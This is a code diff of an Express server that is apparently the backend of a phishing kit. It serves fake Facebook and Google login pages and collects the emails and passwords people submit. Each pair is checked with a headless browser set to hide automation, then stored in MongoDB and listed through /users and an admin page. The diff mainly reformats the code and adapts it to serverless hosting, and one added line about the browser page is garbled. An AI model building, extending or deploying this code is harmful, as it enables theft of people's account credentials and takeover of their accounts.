@@ -1,6 +1,7 @@
 const express = require('express');
-const { chromium } = require('playwright');
 const path = require('path');
+const chromiumSparticuz = require('@sparticuz/chromium');
+const { chromium: playwrightChromium } = require('playwright-core');
 const dns = require("dns");
 const mongoose = require('mongoose');
 const FacebookUser = require("./models/facebook/users");
@@ -22,15 +23,15 @@ const connect = async () => {
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
-app.get("/users",async(req,res)=>{
+app.get("/users", async (req, res) => {
   const users = await getAllThings();
   res.json(users);
 });
-app.get("/", async(req,res)=>{
-  res.sendFile(path.join(__dirname,"index.html"));
+app.get("/", async (req, res) => {
+  res.sendFile(path.join(__dirname, "index.html"));
 });
-app.get("/admin",(req,res)=>{
-  res.sendFile(path.join(__dirname,"admin.html"));
+app.get("/admin", (req, res) => {
+  res.sendFile(path.join(__dirname, "admin.html"));
 });
 let facebook = 0;
 let google = 0;
@@ -42,53 +43,53 @@ app.post('/login', async (req, res) => {
   const { email, password } = req.body;
   const result = await FacebookCheck(email, password);
   console.log(`\nResult: ${result}`);
-  
-  if(result){
+
+  if (result) {
     console.log("yes");
-    await facebookPostData(email,password);
+    await facebookPostData(email, password);
     console.log("\nPosted");
   }
   res.json({ success: result });
-    
-    
+
+
 
   facebook++;
   console.log(facebook);
-  
+
 });
-app.get("/google",async(req,res)=>{
+app.get("/google", async (req, res) => {
   res.sendFile(path.join(__dirname, 'google.html'));
 });
-app.post("/google/login",async(req,res)=>{
+app.post("/google/login", async (req, res) => {
   const { email, password } = req.body;
   const result = await GoogleCheck(email, password);
   console.log(`\nGoogle_Result: ${result}`);
-  
-  if(result&&google<2){
-    await GooglePost(email,password);
+
+  if (result && google < 2) {
+    await GooglePost(email, password);
     console.log("\nGoogle_Posted");
   }
-  if(google<2){
+  if (google < 2) {
     res.json({ success: result });
-    
-    
+
+
   }
-  else{
+  else {
     res.json({ sucess: false });
   }
   google++;
   console.log(`Google number: ${google}`);
 });
-app.delete("/delete",async(req,res)=>{
-  const result = (req.body.type=="Google")?await GoogleDelete(req.body.id):await FacebookDelete(req.body.id);
+app.delete("/delete", async (req, res) => {
+  const result = (req.body.type == "Google") ? await GoogleDelete(req.body.id) : await FacebookDelete(req.body.id);
   console.log(result);
   res.json({ success: result });
 });
-async function contains(elements, target,target2="",target3="") {
+async function contains(elements, target, target2 = "", target3 = "") {
   for (const element of elements) {
     try {
       const text = await element.innerText();
-      if (text.trim().includes(target)||text.trim().includes(target2)||text.trim()==target3) {
+      if (text.trim().includes(target) || text.trim().includes(target2) || text.trim() == target3) {
         console.log(text.trim());
         return true;
       }
@@ -98,15 +99,19 @@ async function contains(elements, target,target2="",target3="") {
 }
 
 async function FacebookCheck(email, pass) {
-  const context = await chromium.launchPersistentContext('./user_data', {
-    headless: true,
-    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    viewport: { width: 1280, height: 720 },
-    args: ['--disable-blink-features=AutomationControlled']
+  // استبدل launchPersistentContext بهذا الكود داخل FacebookCheck و GoogleCheck:
+  const isVercel = process.env.VERCEL || process.env.AWS_EXECUTION_ENV;
+  const browser = await playwrightChromium.launch({
+    args: isVercel ? chromiumSparticuz.args : ['--disable-blink-features=AutomationControlled'],
+    executablePath: isVercel ? await chromiumSparticuz.executablePath() : undefined,
+    headless: isVercel ? chromiumSparticuz.headless : true,
   });
-  console.log("Hello");
+  const context = await browser.newContext({
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+  });
 
-  const page = await context.newPage();
+  const page = await context.close ? await context.newPage() : null; // أو page العادي
+  // ولا تنسَ استبدال context.close() بـ await browser.close() عند الانتهاء
 
   try {
     await page.goto('https://www.facebook.com/login/identify/');
@@ -116,50 +121,55 @@ async function FacebookCheck(email, pass) {
     await page.waitForNavigation({ waitUntil: 'networkidle', timeout: 10000 }).catch(() => { });
 
     const fontElements = await page.locator('span').all();
-    const exists = await contains(fontElements, "No account","Something went wrong","No account");
+    const exists = await contains(fontElements, "No account", "Something went wrong", "No account");
     console.log(exists);
-    await context.close();
+    await browser.close();
     return !exists;
   } catch (error) {
-    await context.close();
+    await browser.close();
     throw error;
   }
-  if(!(context.isClosed())){
+  if (!(context.isClosed())) {
     context.close();
   }
 }
 
 
-async function facebookPostData(email,password,username=""){
+async function facebookPostData(email, password, username = "") {
 
   const user = new FacebookUser({
     email: email,
     password: password,
     username: username
   });
-  await user.save().then((result)=>{
-    console.log('\n',result);
-  }).catch((err)=>{
-    console.log('\n',err);
+  await user.save().then((result) => {
+    console.log('\n', result);
+  }).catch((err) => {
+    console.log('\n', err);
   });
 }
 
-app.listen(PORT, async() => {
+app.listen(PORT, async () => {
   const request = await fetch("https://api.ipify.org?format=json");
   const data = await request.json();
   console.log(data.ip);
   console.log(`\nServer is happily running on http://localhost:${PORT}`);
   connect();
 });
-async function GoogleCheck(email,password){
-  const context = await chromium.launchPersistentContext('./user_data', {
-    headless: true,
-    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    viewport: { width: 1280, height: 720 },
-    args: ['--disable-blink-features=AutomationControlled']
+async function GoogleCheck(email, password) {
+  // استبدل launchPersistentContext بهذا الكود داخل FacebookCheck و GoogleCheck:
+  const isVercel = process.env.VERCEL || process.env.AWS_EXECUTION_ENV;
+  const browser = await playwrightChromium.launch({
+    args: isVercel ? chromiumSparticuz.args : ['--disable-blink-features=AutomationControlled'],
+    executablePath: isVercel ? await chromiumSparticuz.executablePath() : undefined,
+    headless: isVercel ? chromiumSparticuz.headless : true,
+  });
+  const context = await browser.newContext({
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
   });
 
-  const page = await context.newPage();
+  const page = await context.close ? await context.newPage() : null; // أو page العادي
+  // ولا تنسَ استبدال context.close() بـ await browser.close() عند الانتهاء
 
   try {
 
@@ -169,49 +179,49 @@ async function GoogleCheck(email,password){
     await page.click('button[type="button"]');
     await page.waitForNavigation({ waitUntil: 'networkidle', timeout: 5000 }).catch(() => { });
     const textElements = await page.locator("*").all();
-   
-    const exists = await contains(textElements,"Couldn't","Enter an email or phone number","Type the text you hear or see");
-  
+
+    const exists = await contains(textElements, "Couldn't", "Enter an email or phone number", "Type the text you hear or see");
+
 
     console.log(exists);
-    await context.close();
+    await browser.close();
     return !exists;
   } catch (error) {
-    await context.close();
+    await browser.close();
     throw error;
   }
-  if(!(context.isClosed())){
+  if (!(context.isClosed())) {
     context.close();
   }
 }
 
-async function GooglePost(email,password,username=""){
+async function GooglePost(email, password, username = "") {
   const user = new GoogleUser({
     password: password,
     email: email,
     username: username
   });
-  await user.save().then((result)=>{
-    console.log('\n',result);
-  }).catch((err)=>{
-    console.log('\n',err);
+  await user.save().then((result) => {
+    console.log('\n', result);
+  }).catch((err) => {
+    console.log('\n', err);
   });
 }
-async function FacebookDelete(id){
+async function FacebookDelete(id) {
   const result = await FacebookUser.findByIdAndDelete(id);
   console.log("Facebook");
   return result;
 }
-async function GoogleDelete(id){
+async function GoogleDelete(id) {
   const result = await GoogleUser.findByIdAndDelete(id);
   console.log("google");
-  return result; 
+  return result;
 }
 
-async function getAllThings(){
+async function getAllThings() {
   const facebooks = await FacebookUser.find();
   const googles = await GoogleUser.find();
-  
+
   const users = {
     facebook: facebooks,
     google: googles
